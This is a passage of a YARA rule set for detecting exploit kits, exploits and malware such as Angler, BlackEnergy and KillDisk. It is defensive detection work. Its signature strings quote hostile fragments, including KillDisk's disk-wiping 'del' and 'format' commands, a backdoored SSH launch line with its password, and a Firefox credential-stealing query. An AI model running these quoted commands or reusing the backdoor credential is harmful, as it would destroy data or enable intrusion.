author = "adnan.shukor@gmail.com"
date = "08-July-2015"
impact = "5"
version = "1"
strings:
$ekr1 = "<script>var date = new Date(new Date().getTime() + 60*60*24*7*1000);" fullword
$ekr2 = "document.cookie=\"PHP_SESSION_PHP="
$ekr3 = "path=/; expires=\"+date.toUTCString();</script>" fullword
$ekr4 = "<iframe src=" fullword
$ekr5 = "</iframe></div>" fullword
condition:
all of them
}
rule SSC_angler_jar : EK
{
meta:
author = "Josh Berry"
date = "2016-06-26"
description = "Angler Exploit Kit Detection"
hash0 = "3de78737b728811af38ea780de5f5ed7"
sample_filetype = "unknown"
yaragenerator = "https://github.com/Xen0ph0n/YaraGenerator"
strings:
$string0 = "myftysbrth"
$string1 = "classPK"
$string2 = "8aoadN"
$string3 = "j5/_<F"
$string4 = "FXPreloader.class"
$string5 = "V4w\\K,"
$string6 = "W\\Vr2a"
$string7 = "META-INF/MANIFEST.MF"
$string8 = "Na8$NS"
$string9 = "_YJjB'"
condition:
9 of them
}
rule SSC_angler_flash2 : EK
{
meta:
author = "Josh Berry"
date = "2016-06-26"
description = "Angler Exploit Kit Detection"
hash0 = "23812c5a1d33c9ce61b0882f860d79d6"
sample_filetype = "unknown"
yaragenerator = "https://github.com/Xen0ph0n/YaraGenerator"
strings:
$string0 = "4yOOUj"
$string1 = "CSvI4e"
$string2 = "'fwaEnkI"
$string3 = "'y4m%X"
$string4 = "eOc)a,"
$string5 = "'0{Q5<"
$string6 = "1BdX;P"
$string7 = "D _J)C"
$string8 = "-epZ.E"
$string9 = "QpRkP."
$string10 = "<o/]atel"
$string11 = "@B.,X<"
$string12 = "5r[c)U"
$string13 = "52R7F'"
$string14 = "NZ[FV'P"
condition:
14 of them
}
rule SSC_angler_html : EK
{
meta:
author = "Josh Berry"
date = "2016-06-26"
description = "Angler Exploit Kit Detection"
hash0 = "afca949ab09c5583a2ea5b2006236666"
sample_filetype = "js-html"
yaragenerator = "https://github.com/Xen0ph0n/YaraGenerator"
strings:
$string0 = " A9 3E AF D5 9AQ FA 14 BC F2 A0H EA 7FfJ A58 A3 B1 BD 85 DB F3 B4 B6 FB B2 B4 14 82 19 88 28 D0 EA 2"
$string1 = " 2BS 25 26p 20 3F 81 0E D3 9C 84 C7 EC C3 C41M C48 D3 B5N 09 C2z 98 7B 09. DF 05 5EQ DF A3 B6 EE D5 "
$string2 = "9 A1Fg A8 837 9A A9 0A 1D 40b02 A5U6 22o 16 DC 5D F5 F5 FA BE FB EDX F0 87 DB C9 7B D6 AC F6D 10 1AJ"
$string3 = "24 AA 17 FB B0 96d DBN 05 EE F6 0F 24 D4 D0 C0 E4 96 03 A3 03 20/ 04 40 DB 8F 7FI A6 DC F5 09 0FWV 1"
$string4 = "Fq B3 94 E3 3E EFw E6 AA9 3A 5B 9E2 D2 EC AF6 10c 83 0F DF BB FBx AF B4 1BV 5C DD F8 9BR 97v D0U 9EG"
$string5 = "29 9B 01E C85 86 B0 09 EC E07 AFCY 19 E5 11 1C 92 E2 DA A9 5D 19P 3A BF AB D6 B3 3FZ B4 92 FF E1 27 "
$string6 = "B A9 88 B8 F0 EBLd 8E 08 18 11P EE BFk 15 5BM D6 B7 CEh AF 9C 8F 04 89 88 5E F6 ED 13 8EN1p 86Vk BC "
$string7 = "w F4 C8 16pV 22 0A BB EB 83 7D BC 89 B6 E06 8B 2A DC E6 7D CE. 0Dh 18 0A8 5E 60 0C BF A4 00M 00 E3 3"
$string8 = "B7 C6 E3 8E DC 3BR 60L 94h D8 AA7k5s 0D 7Fb 8B 80P E0 1BP EBT B5 03zE D0o 2A B97 18 F39 7C 94 99 11 "
$string9 = "kY 24 8E 3E 94 84 D2 00 1EB 16 A4 9C 28 24 C1B BB 22 7D 97c F5 BA AD C4 5C 23 5D 3D 5C A7d5 0C F6 EA"
$string10 = "08 01 3A 15 3B E0 1A E2 89 5B A2 F4 ED 87O F9l A99 124 27 BF BB A1c 2BW 12Z 07 AA D9 81 B7 A6-5 E2 E"
$string11 = " 16 BF A7 0E 00 16 BB 8FB CBn FC D8 9C C7 EA AC C2q 85n A96I D1 9B FC8 BDl B8 3Ajf 7B ADH FD 20 88 F"
$string12 = "  ML    "
$string13 = " AEJ 3B C7 BFy EF F07X D3 A0 1E B4q C4 BE 3A 10 E7 A0 FE D1Jhp 89 A0sj 1CW 08 D5 F7 C8 C6 D5I 81 D2 "
$string14 = "B 24 90 ED CEP C8 C9 9B E5 25 09 C6B- 2B 3B C7 28 C9 C62 EB D3 D5 ED DE A8 7F A9mNs 87 12 82 03 A2 8"
$string15 = "A 3A A2L DFa 18 11P 00 7F1 BBbY FA 5E 04 C4 5D 89 F3S DAN B5 CAi 8D 0A AC A8 0A ABI E6 1E 89 BB 07 D"
$string16 = "C B5 FD 0B F9 0Ch CE 01 14 8Dp AF 24 E0 E3 D90 DD FF B0 07 2Ad 0B 7D B0 B2 D8 BD E6 A7 CE E1 E4 3E5 "
$string17 = "19 0C 85 14r/ 8C F3 84 2B 8C CF 90 93 E2 F6zo C3 D40 A6 94 01 02Q 21G AB B9 CDx 9D FB 21 2C 10 C3 3C"
$string18 = "FAV D7y A0 C7Ld4 01 22 EE B0 1EY FAB BA E0 01 24 15g C5 DA6 19 EEsl BF C7O 9F 8B E8 AF 93 F52 00 06 "
condition:
18 of them
}
rule SSC_angler_js : EK
{
meta:
author = "Josh Berry"
date = "2016-06-26"
description = "Angler Exploit Kit Detection"
hash0 = "482d6c24a824103f0bcd37fa59e19452"
sample_filetype = "js-html"
yaragenerator = "https://github.com/Xen0ph0n/YaraGenerator"
strings:
$string0 = "    2654435769,   Be"
$string1 = "DFOMIqka "
$string2 = ",  Zydr$>>16"
$string3 = "DFOMIqka( 'OPPj_phuPuiwzDFo')"
$string4 = "U0BNJWZ9J0vM43TnlNZcWnZjZSelQZlb1HGTTllZTm19emc0dlsYF13GvhQJmTZmbVMxallMdhWW948YWi t    P  b50GW"
$string5 = "    auSt;"
$string6 = " eval    (NDbMFR "
$string7 = "jWUwYDZhNVyMI2TzykEYjWk0MDM5MA%ZQ1TD1gEMzj         3  D       ',"
$string8 = "('fE').substr    (2    ,    1 "
$string9 = ",  -1 "
$string10 = "    )  );Zydr$  [ 1]"
$string11 = " 11;PsKnARPQuNNZMP<9;PsKnARPQuNNZMP"
$string12 = "new   Array  (2),  Ykz"
$string13 = "<script> "
$string14 = ");    CYxin "
$string15 = "Zydr$    [    1]"
$string16 = "var tKTGVbw,auSt, vnEihY, gftiUIdV, XnHs, UGlMHG, KWlqCKLfCV;"
$string17 = "reXKyQsob1reXKyQsob3 "
condition:
17 of them
}
rule SSC_angler_html2 : EK
{
meta:
author = "Josh Berry"
date = "2016-06-26"
description = "Angler Exploit Kit Detection"
hash0 = "6c926bf25d1a8a80ab988c8a34c0102e"
sample_filetype = "js-html"
yaragenerator = "https://github.com/Xen0ph0n/YaraGenerator"
strings:
$string0 = "E 06 E7i 1E 91q 9C D0J 1D 9B 14 E7g 1D DD ECK 20c 40 C6 0C AFR5 3D 03 9Em EC 0CB C9 A9 DFw C9 ADP 5B"
$string1 = "14Bc 5C 3Bp CB 2A 12 3D A56 AA 14 87 E3 81 8A 80h 27 1C 3A4 CE 12 AE FAy F0 8A 21 B8I AD 1E B9 2C D1"
$string2 = "0J 95 83 CC 1C 95D CAD 1A EA F3 00 E9 DA_ F2 ED 3CM1 A0 01t 1B EE 2C B6AWKq BF CAY FE D8 F2 7C 96 92"
$string3 = "A8MTCsn C9 DBu D3 10 A0 D4 AC A9 97 06Rn 01 DAK EFFN ADP AE 0E 8FJd 8F DA B6 25RO 18 2A 00 EA F9 8B "
$string4 = "A3 EB C1 CE 1E C4ok C4 19 F2 A7 17 9FCoz B6- C6 25J BB 0B 8C1OZ E4 7B AEz F6 06A 5D C0 D7 E8 FF DB D"
$string5 = " 07 DE A3 F8 B0 B3 20V A4 B2 C8 60 BD EEG 95 BB 04 1Ckw A4 80 E6 23 F02 FA 9C 9A 14F BDC 18 BE BD B4"
$string6 = "7 D1 B9 9B AC 2AN BA D3 00 A9 1CJ3J C0V 8F 8E FC B6p9 00 E1 01 21j B3 27 FF C3 8E 2B 92 8B DEiUI C3 "
$string7 = " 99 2C AF9 F9 3F5 A8 F0 1BU C8e/ 00Q B4 10 DD BC 9D 8A BF B2 17 8F BFd DB D1 B7 E66 21 96 86 1E B2 1"
$string8 = "E86 DF9 22Tg E93 9Em 29 0A 5B B5m E2 DCIF D6 D2 F5B CF F7XkRv BE EA A6 C5 82p 5E B3 B4aD B9 3A E0 22"
$string9 = " 7C 95.q D6f E8 1AE 17 82T 84 F1/O 82 C2q C7 FE 05C E4 E5W F5 0A E4l 12 3Brt 8A E0 E7 DDJ 1F 1F C4 A"
$string10 = "4t 91iE BD 2C 95U E9 1C AE 5B 5B A3 9D B2 F9 0B B5 15S9 AB 9D 94 85 A6 F1 AF B6 FC CAt 91iE BD 2C 95"
$string11 = "  </input>"
$string12 = "2 D12 93 FD AB 0DKK AEN 40 DA 88 7B FA 3B 18 EE 09 92 ED AF A8b 07 002 0A A3S 04 29 F9 A3 EA BB E9 7"
$string13 = "40 C6 0C AFR5E 15 07 EE CBg B3 C6 60G 92tFt D7E 7D F0 C4 A89 29 EC BA E1 D9 3D 23 F0 0B E0o 3E2c B3 "
$string14 = "2 A3. A3 F1 D8 D4 A83K 9C AEu FF EA 02 F4 B8 A0 EE C9 7B 15 C1 07D 80 7C 10 864 96 E3 AA F8 99bgve D"
$string15 = "C 7D DC 0A E9 0D A1k 85s 9D 24 8C D0k E1 7E 3AH E2 052 D8q 16 FC 96 0AR C0 EC 99K4 3F BE ED CC DBE A"
$string16 = "40 DA 88 7B 9E 1A B3 FA DE 90U 5B BD6x 9A 0C 163 AB EA ED B4 B5 98 ADL B7 06 EE E5y B8 9B C9Q 00 E9 "
$string17 = "F BF_ F9 AC 5B CC 0B1 7B 60 20c 40 C6 0C AFR5 0B C7D 09 9D E30 14 AC 027 B2 B9B A7 06 E3z DC- B2 60 "
$string18 = "0 80 97Oi 8C 85 D2 1Bp CDv 11 05 D4 26 E7 FC 3DlO AE 96 D2 1B 89 7C 16H 11 86 D0 A6 B95 FC 01 C5 8E "
condition:
18 of them
}
rule SSC_angler_flash_uncompressed : EK
{
meta:
author = "Josh Berry"
date = "2016-06-26"
description = "Angler Exploit Kit Detection"
hash0 = "2543855d992b2f9a576f974c2630d851"
sample_filetype = "unknown"
yaragenerator = "https://github.com/Xen0ph0n/YaraGenerator"
strings:
$string0 = "DisplayObjectContainer"
$string1 = "Xtime2"
$string2 = "(HMRTQ"
$string3 = "flash.events:EventDispatcher$flash.display:DisplayObjectContainer"
$string4 = "_e_-___-__"
$string5 = "ZviJbf"
$string6 = "random-"
$string7 = "_e_-_-_-_"
$string8 = "_e_------"
$string9 = "817677162"
$string10 = "_e_-__-"
$string11 = "-[vNnZZ"
$string12 = "5:unpad: Invalid padding value. expected ["
$string13 = "writeByte/"
$string14 = "enumerateFonts"
$string15 = "_e_---___"
$string16 = "_e_-_-"
$string17 = "f(fOJ4"
condition:
17 of them
}
rule SSC_Flash_CVE_2015_5119_APT3 : Exploit {
meta:
description = "Exploit Sample CVE-2015-5119"
author = "Florian Roth"
score = 70
date = "2015-08-01"
strings:
$s0 = "HT_exploit" fullword ascii
$s1 = "HT_Exploit" fullword ascii
$s2 = "flash_exploit_" ascii
$s3 = "exp1_fla/MainTimeline" ascii fullword
$s4 = "exp2_fla/MainTimeline" ascii fullword
$s5 = "_shellcode_32" fullword ascii
$s6 = "todo: unknown 32-bit target" fullword ascii
condition:
uint16(0) == 0x5746 and 1 of them
}
rule SSC_TidePool_Malware
{
meta:
description = "Detects TidePool malware mentioned in Ke3chang report by Palo Alto Networks"
author = "Florian Roth"
reference = "http://goo.gl/m2CXWR"
date = "2016-05-24"
hash1 = "9d0a47bdf00f7bd332ddd4cf8d95dd11ebbb945dda3d72aac512512b48ad93ba"
hash2 = "67c4e8ab0f12fae7b4aeb66f7e59e286bd98d3a77e5a291e8d58b3cfbc1514ed"
hash3 = "2252dcd1b6afacde3f94d9557811bb769c4f0af3cb7a48ffe068d31bb7c30e18"
hash4 = "38f2c86041e0446730479cdb9c530298c0c4936722975c4e7446544fd6dcac9f"
hash5 = "9d0a47bdf00f7bd332ddd4cf8d95dd11ebbb945dda3d72aac512512b48ad93ba"
strings:
$x1 = "Content-Disposition: form-data; name=\"m1.jpg\"" fullword ascii
$x2 = "C:\\PROGRA~2\\IEHelper\\mshtml.dll" fullword wide
$x3 = "C:\\DOCUME~1\\ALLUSE~1\\IEHelper\\mshtml.dll" fullword wide
$x4 = "IEComDll.dat" fullword ascii
$s1 = "Content-Type: multipart/form-data; boundary=----=_Part_%x" fullword wide
$s2 = "C:\\Windows\\System32\\rundll32.exe" fullword wide
$s3 = "network.proxy.socks_port\", " fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 200KB and ( 1 of ($x*) ) ) or ( 4 of them )
}
rule SSC_Mal_http_EXE : Trojan {
meta:
description = "Detects trojan from APT report named http.exe"
author = "Florian Roth"
reference = "https://goo.gl/13Wgy1"
date = "2016-05-25"
score = 80
hash1 = "ad191d1d18841f0c5e48a5a1c9072709e2dd6359a6f6d427e0de59cfcd1d9666"
strings:
$x1 = "Content-Disposition: form-data; name=\"file1\"; filename=\"%s\"" fullword ascii
$x2 = "%ALLUSERSPROFILE%\\Accessories\\wordpade.exe" fullword ascii
$x3 = "\\dumps.dat" fullword ascii
$x4 = "\\wordpade.exe" fullword ascii
$x5 = "\\%s|%s|4|%d|%4d-%02d-%02d %02d:%02d:%02d|" fullword ascii
$x6 = "\\%s|%s|5|%d|%4d-%02d-%02d %02d:%02d:%02d|" fullword ascii
$x7 = "cKaNBh9fnmXgJcSBxx5nFS+8s7abcQ==" fullword ascii
$x8 = "cKaNBhFLn1nXMcCR0RlbMQ==" fullword ascii /* base64: pKY1[1 */
$s1 = "SELECT * FROM moz_logins;" fullword ascii
$s2 = "makescr.dat" fullword ascii
$s3 = "%s\\Mozilla\\Firefox\\profiles.ini" fullword ascii
$s4 = "?moz-proxy://" fullword ascii
$s5 = "[%s-%s] Title: %s" fullword ascii
$s6 = "Cforeign key mismatch - \"%w\" referencing \"%w\"" fullword ascii
$s7 = "Windows 95 SR2" fullword ascii
$s8 = "\\|%s|0|0|" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 2000KB and ( 1 of ($x*) and 2 of ($s*) ) ) or ( 3 of ($x*) )
}
rule SSC_Mal_Dropper_httpEXE_from_CAB : Dropper {
meta:
description = "Detects a dropper from a CAB file mentioned in the article"
author = "Florian Roth"
reference = "https://goo.gl/13Wgy1"
date = "2016-05-25"
score = 60
hash1 = "9e7e5f70c4b32a4d5e8c798c26671843e76bb4bd5967056a822e982ed36e047b"
strings:
$s1 = "029.Hdl" fullword ascii
$s2 = "http.exe" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 1000KB and ( all of ($s*) ) )
}
rule SSC_Mal_PotPlayer_DLL : dll {
meta:
description = "Detects a malicious PotPlayer.dll"
author = "Florian Roth"
reference = "https://goo.gl/13Wgy1"
date = "2016-05-25"
score = 70
hash1 = "705409bc11fb45fa3c4e2fa9dd35af7d4613e52a713d9c6ea6bc4baff49aa74a"
strings:
$x1 = "C:\\Users\\john\\Desktop\\PotPlayer\\Release\\PotPlayer.pdb" fullword ascii
$s3 = "PotPlayer.dll" fullword ascii
$s4 = "\\update.dat" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 200KB and $x1 or all of ($s*)
}
rule SSC_Exploit_MS15_077_078: Exploit {
meta:
description = "MS15-078 / MS15-077 exploit - generic signature"
author = "Florian Roth"
reference = "https://code.google.com/p/google-security-research/issues/detail?id=473&can=1&start=200"
date = "2015-07-21"
hash1 = "18e3e840a5e5b75747d6b961fca66a670e3faef252aaa416a88488967b47ac1c"
hash2 = "0b5dc030e73074b18b1959d1cf7177ff510dbc2a0ec2b8bb927936f59eb3d14d"
hash3 = "fc609adef44b5c64de029b2b2cff22a6f36b6bdf9463c1bd320a522ed39de5d9"
hash4 = "ad6bb982a1ecfe080baf0a2b27950f989c107949b1cf02b6e0907f1a568ece15"
strings:
$s1 = "GDI32.DLL" fullword ascii
$s2 = "atmfd.dll" fullword wide
$s3 = "AddFontMemResourceEx" fullword ascii
$s4 = "NamedEscape" fullword ascii
$s5 = "CreateBitmap" fullword ascii
$s6 = "DeleteObject" fullword ascii
$op0 = { 83 45 e8 01 eb 07 c7 45 e8 } /* Opcode */
$op1 = { 8d 85 24 42 fb ff 89 04 24 e8 80 22 00 00 c7 45 } /* Opcode */
$op2 = { eb 54 8b 15 6c 00 4c 00 8d 85 24 42 fb ff 89 44 } /* Opcode */
$op3 = { 64 00 88 ff 84 03 70 03 }
condition:
uint16(0) == 0x5a4d and filesize < 2000KB and all of ($s*) or all of ($op*)
}
rule SSC_Exploit_MS15_077_078_HackingTeam: Exploit {
meta:
description = "MS15-078 / MS15-077 exploit - Hacking Team code"
author = "Florian Roth"
date = "2015-07-21"
super_rule = 1
hash1 = "ad6bb982a1ecfe080baf0a2b27950f989c107949b1cf02b6e0907f1a568ece15"
hash2 = "fc609adef44b5c64de029b2b2cff22a6f36b6bdf9463c1bd320a522ed39de5d9"
strings:
$s1 = "\\SystemRoot\\system32\\CI.dll" fullword ascii /* PEStudio Blacklist: strings */
$s2 = "\\sysnative\\CI.dll" fullword ascii /* PEStudio Blacklist: strings */
$s3 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36" fullword ascii /* PEStudio Blacklist: strings */
$s4 = "CRTDLL.DLL" fullword ascii
$s5 = "\\sysnative" fullword ascii /* PEStudio Blacklist: strings */
$s6 = "InternetOpenA coolio, trying open %s" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 2500KB and all of them
}
rule SSC_CVE_2015_1701_Taihou {
meta:
description = "CVE-2015-1701 compiled exploit code"
author = "Florian Roth"
reference = "http://goo.gl/W4nU0q"
date = "2015-05-13"
hash1 = "90d17ebd75ce7ff4f15b2df951572653efe2ea17"
hash2 = "acf181d6c2c43356e92d4ee7592700fa01e30ffb"
hash3 = "b8aabe12502f7d55ae332905acee80a10e3bc399"
hash4 = "d9989a46d590ebc792f14aa6fec30560dfe931b1"
hash5 = "63d1d33e7418daf200dc4660fc9a59492ddd50d9"
score = 70
strings:
$s3 = "VirtualProtect" fullword
$s4 = "RegisterClass"
$s5 = "LoadIcon"
$s6 = "PsLookupProcessByProcessId" fullword ascii
$s7 = "LoadLibraryExA" fullword ascii
$s8 = "gSharedInfo" fullword
$w1 = "user32.dll" wide
$w2 = "ntdll" wide
condition:
uint16(0) == 0x5a4d and filesize < 160KB and all of ($s*) and 1 of ($w*)
}
rule SSC_CVE_2013_0422
{
meta:
description = "Java Applet JMX Remote Code Execution"
cve = "CVE-2013-0422"
ref = "http://pastebin.com/JVedyrCe"
author = "adnan.shukor@gmail.com"
date = "12-Jan-2013"
version = "1"
impact = 4
hide = false
strings:
$0422_1 = "com/sun/jmx/mbeanserver/JmxMBeanServer" fullword
$0422_2 = "com/sun/jmx/mbeanserver/JmxMBeanServerBuilder" fullword
$0422_3 = "com/sun/jmx/mbeanserver/MBeanInstantiator" fullword
$0422_4 = "findClass" fullword
$0422_5 = "publicLookup" fullword
$class = /sun\.org\.mozilla\.javascript\.internal\.(Context|GeneratedClassLoader)/ fullword
condition:
(all of ($0422_*)) or (all of them)
}
rule SSC_cve_2013_0074
{
meta:
author = "Kaspersky Lab"
filetype = "Win32 EXE"
date = "2015-07-23"
version = "1.0"
strings:
$b2="Can't find Payload() address" ascii wide
$b3="/SilverApp1;component/App.xaml" ascii wide
$b4="Can't allocate ums after buf[]" ascii wide
$b5="------------ START ------------"
condition:
( (2 of ($b*)) )
}
rule SSC_FlashNewfunction: decodedPDF
{
meta:
ref = "CVE-2010-1297"
hide = true
impact = 5
ref = "http://blog.xanda.org/tag/jsunpack/"
strings:
$unescape = "unescape" fullword nocase
$shellcode = /%u[A-Fa-f0-9]{4}/
$shellcode5 = /(%u[A-Fa-f0-9]{4}){5}/
$cve20101297 = /\/Subtype ?\/Flash/
condition:
($unescape and $shellcode and $cve20101297) or ($shellcode5 and $cve20101297)
}
rule SSC_macrocheck : maldoc
{
meta:
Author      = "Fireeye Labs"
Date        = "2014/11/30"
Description = "Identify office documents with the MACROCHECK credential stealer in them.  It can be run against .doc files or VBA macros extraced from .docx files (vbaProject.bin files)."
Reference   = "https://www.fireeye.com/blog/threat-research/2014/11/fin4_stealing_insid.html"
strings:
$PARAMpword = "pword=" ascii wide
$PARAMmsg = "msg=" ascii wide
$PARAMuname = "uname=" ascii
$userform = "UserForm" ascii wide
$userloginform = "UserLoginForm" ascii wide
$invalid = "Invalid username or password" ascii wide
$up1 = "uploadPOST" ascii wide
$up2 = "postUpload" ascii wide
condition:
all of ($PARAM*) or (($invalid or $userloginform or $userform) and ($up1 or $up2))
}
rule SSC_malrtf_ole2link : exploit
{
meta:
author = "@h3x2b <tracker _AT h3x.eu>"
description = "Detect weaponized RTF documents with OLE2Link exploit"
strings:
//normal rtf beginning
$rtf_format_00 = "{\\rtf1"
//malformed rtf can have for example {\\rtA1
$rtf_format_01 = "{\\rt"
//having objdata structure
$rtf_olelink_01 = "\\objdata" nocase
//hex encoded OLE2Link
$rtf_olelink_02 = "4f4c45324c696e6b" nocase
//hex encoded docfile magic - doc file albilae
$rtf_olelink_03 = "d0cf11e0a1b11ae1" nocase
//hex encoded "http://"
$rtf_payload_01 = "68007400740070003a002f002f00" nocase
//hex encoded "https://"
$rtf_payload_02 = "680074007400700073003a002f002f00" nocase
//hex encoded "ftp://"
$rtf_payload_03 = "6600740070003a002f002f00" nocase
condition:
//new_file and
any of ($rtf_format_*)
and all of ($rtf_olelink_*)
and any of ($rtf_payload_*)
}
rule SSC_Upatre_Hazgurut {
meta:
description = "Detects Upatre malware - file hazgurut.exe"
author = "Florian Roth"
reference = "https://weankor.vxstream-sandbox.com/sample/6b857ef314938d37997c178ea50687a281d8ff9925f0c4e70940754643e2c0e3?environmentId=7"
date = "2015-10-13"
score = 70
hash1 = "7ee0d20b15e24b7fe72154d9521e1959752b4e9c20d2992500df9ac096450a50"
hash2 = "79ffc620ddb143525fa32bc6a83c636168501a4a589a38cdb0a74afac1ee8b92"
hash3 = "62d8a6880c594fe9529158b94a9336179fa7a3d3bf1aa9d0baaf07d03b281bd3"
hash4 = "c64282aca980d558821bec8b3dfeae562d9620139dc43d02ee4d1745cd989f2a"
hash5 = "a35f9870f9d4b993eb094460b05ee1f657199412807abe6264121dd7cc12aa70"
hash6 = "f8cb2730ebc8fac1c58da1346ad1208585fe730c4f03d976eb1e13a1f5d81ef9"
hash7 = "b65ad7e2d299d6955d95b7ae9b62233c34bc5f6aa9f87dc482914f8ad2cba5d2"
hash8 = "6b857ef314938d37997c178ea50687a281d8ff9925f0c4e70940754643e2c0e3"
hash9 = "33a288cef0ae7192b34bd2ef3f523dfb7c6cbc2735ba07edf988400df1713041"
hash10 = "2a8e50afbc376cb2a9700d2d83c1be0c21ef942309676ecac897ba4646aba273"
hash11 = "3d0f2c7e07b7d64b1bad049b804ff1aae8c1fc945a42ad555eca3e1698c7f7d3"
hash12 = "951360b32a78173a1f81da0ded8b4400e230125d05970d41621830efc5337274"
hash13 = "bd90faebfd7663ef89b120fe69809532cada3eb94bb94094e8bc615f70670295"
hash14 = "8c5823f67f9625e4be39a67958f0f614ece49c18596eacc5620524bc9b6bad3d"
strings:
$a1 = "barcod" fullword ascii
$s0 = "msports.dll" fullword ascii
$s1 = "nddeapi.dll" fullword ascii
$s2 = "glmf32.dll" fullword ascii
$s3 = "<requestedExecutionLevel level=\"requireAdministrator\" uiAccess=\"false\">" fullword ascii
$s4 = "cmutil.dll" fullword ascii
$s5 = "mprapi.dll" fullword ascii
$s6 = "glmf32.dll" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 1500KB
and $a1 in (0..4000)
and all of ($s*)
}
rule SSC_hancitor_dropper : vb_win32api
{
meta:
author = "Jeff White - jwhite@paloaltonetworks @noottrak"
date   = "18AUG2016"
hash1  = "03aef51be133425a0e5978ab2529890854ecf1b98a7cf8289c142a62de7acd1a"
hash2  = "4b3912077ef47515b2b74bc1f39de44ddd683a3a79f45c93777e49245f0e9848"
hash3  = "a78972ac6dee8c7292ae06783cfa1f918bacfe956595d30a0a8d99858ce94b5a"
strings:
$api_01 = { 00 56 69 72 74 75 61 6C 41 6C 6C 6F 63 00 }  // VirtualAlloc
$api_02 = { 00 52 74 6C 4D 6F 76 65 4D 65 6D 6F 72 79 00 }  // RtlMoveMemory
$api_04 = { 00 43 61 6C 6C 57 69 6E 64 6F 77 50 72 6F 63 41 00 }  // CallWindowProcAi
$magic  = { 50 4F 4C 41 }  // POLA
condition:
uint32be(0) == 0xD0CF11E0 and all of ($api_*) and $magic
}
rule SSC_BlackEnergy_VBS_Agent
{
meta:
description = "Detects VBS Agent from BlackEnergy Report - file Dropbearrun.vbs"
author = "Florian Roth"
reference = "http://feedproxy.google.com/~r/eset/blog/~3/BXJbnGSvEFc/"
date = "2016-01-03"
hash = "b90f268b5e7f70af1687d9825c09df15908ad3a6978b328dc88f96143a64af0f"
strings:
$s0 = "WshShell.Run \"dropbear.exe -r rsa -d dss -a -p 6789\", 0, false" fullword ascii
$s1 = "WshShell.CurrentDirectory = \"C:\\WINDOWS\\TEMP\\Dropbear\\\"" fullword ascii
$s2 = "Set WshShell = CreateObject(\"WScript.Shell\")" fullword ascii /* Goodware String - occured 1 times */
condition:
filesize < 1KB and 2 of them
}
rule SSC_BlackEnergy_KillDisk_1
{
meta:
description = "Detects KillDisk malware from BlackEnergy"
author = "Florian Roth"
reference = "http://feedproxy.google.com/~r/eset/blog/~3/BXJbnGSvEFc/"
date = "2016-01-03"
score = 80
super_rule = 1
hash1 = "11b7b8a7965b52ebb213b023b6772dd2c76c66893fc96a18a9a33c8cf125af80"
hash2 = "5d2b1abc7c35de73375dd54a4ec5f0b060ca80a1831dac46ad411b4fe4eac4c6"
hash3 = "c7536ab90621311b526aefd56003ef8e1166168f038307ae960346ce8f75203d"
hash4 = "f52869474834be5a6b5df7f8f0c46cbc7e9b22fa5cb30bee0f363ec6eb056b95"
strings:
$s0 = "system32\\cmd.exe" fullword ascii
$s1 = "system32\\icacls.exe" fullword wide
$s2 = "/c del /F /S /Q %c:\\*.*" fullword ascii
$s3 = "shutdown /r /t %d" fullword ascii
$s4 = "/C /Q /grant " fullword wide
$s5 = "%08X.tmp" fullword ascii
$s6 = "/c format %c: /Y /X /FS:NTFS" fullword ascii
$s7 = "/c format %c: /Y /Q" fullword ascii
$s8 = "taskhost.exe" fullword wide /* Goodware String - occured 1 times */
$s9 = "shutdown.exe" fullword wide /* Goodware String - occured 1 times */
condition:
uint16(0) == 0x5a4d and filesize < 500KB and 8 of them
}
rule SSC_BlackEnergy_BackdoorPass_DropBear_SSH
{
meta:
description = "Detects the password of the backdoored DropBear SSH Server - BlackEnergy"
author = "Florian Roth"
reference = "http://feedproxy.google.com/~r/eset/blog/~3/BXJbnGSvEFc/"
date = "2016-01-03"
hash = "0969daac4adc84ab7b50d4f9ffb16c4e1a07c6dbfc968bd6649497c794a161cd"
strings:
$s1 = "passDs5Bu9Te7" fullword ascii
condition:
uint16(0) == 0x5a4d and $s1
}
rule SSC_BlackEnergy_BE_2
{
meta:
description = "Detects BlackEnergy 2 Malware"
author = "Florian Roth"
reference = "http://goo.gl/DThzLz"
date = "2015/02/19"
hash = "983cfcf3aaaeff1ad82eb70f77088ad6ccedee77"
strings:
$s0 = "<description> Windows system utility service  </description>" fullword ascii
$s1 = "WindowsSysUtility - Unicode" fullword wide
$s2 = "msiexec.exe" fullword wide
$s3 = "WinHelpW" fullword ascii
$s4 = "ReadProcessMemory" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 250KB and all of ($s*)
}
rule SSC_BlackEnergy_Driver_USBMDM
{
meta:
description = "Auto-generated rule - from files 7874a10e551377d50264da5906dc07ec31b173dee18867f88ea556ad70d8f094, b73777469f939c331cbc1c9ad703f973d55851f3ad09282ab5b3546befa5b54a, edb16d3ccd50fc8f0f77d0875bf50a629fa38e5ba1b8eeefd54468df97eba281"
author = "Florian Roth"
reference = "http://www.welivesecurity.com/2016/01/03/blackenergy-sshbeardoor-details-2015-attacks-ukrainian-news-media-electric-industry/"
date = "2016-01-04"
super_rule = 1
hash1 = "7874a10e551377d50264da5906dc07ec31b173dee18867f88ea556ad70d8f094"
hash2 = "b73777469f939c331cbc1c9ad703f973d55851f3ad09282ab5b3546befa5b54a"
hash3 = "edb16d3ccd50fc8f0f77d0875bf50a629fa38e5ba1b8eeefd54468df97eba281"
hash4 = "ac13b819379855af80ea3499e7fb645f1c96a4a6709792613917df4276c583fc"
hash5 = "7a393b3eadfc8938cbecf84ca630e56e37d8b3d23e084a12ea5a7955642db291"
hash6 = "405013e66b6f137f915738e5623228f36c74e362873310c5f2634ca2fda6fbc5"
hash7 = "244dd8018177ea5a92c70a7be94334fa457c1aab8a1c1ea51580d7da500c3ad5"
hash8 = "edcd1722fdc2c924382903b7e4580f9b77603110e497393c9947d45d311234bf"
strings:
$s1 = "USB MDM Driver" fullword wide
$s2 = "KdDebuggerNotPresent" fullword ascii /* Goodware String - occured 50 times */
$s3 = "KdDebuggerEnabled" fullword ascii /* Goodware String - occured 69 times */
condition:
uint16(0) == 0x5a4d and filesize < 180KB and all of them
}
rule SSC_DropBear_SSH_Server
{
meta:
description = "Detects DropBear SSH Server (not a threat but used to maintain access)"
author = "Florian Roth"
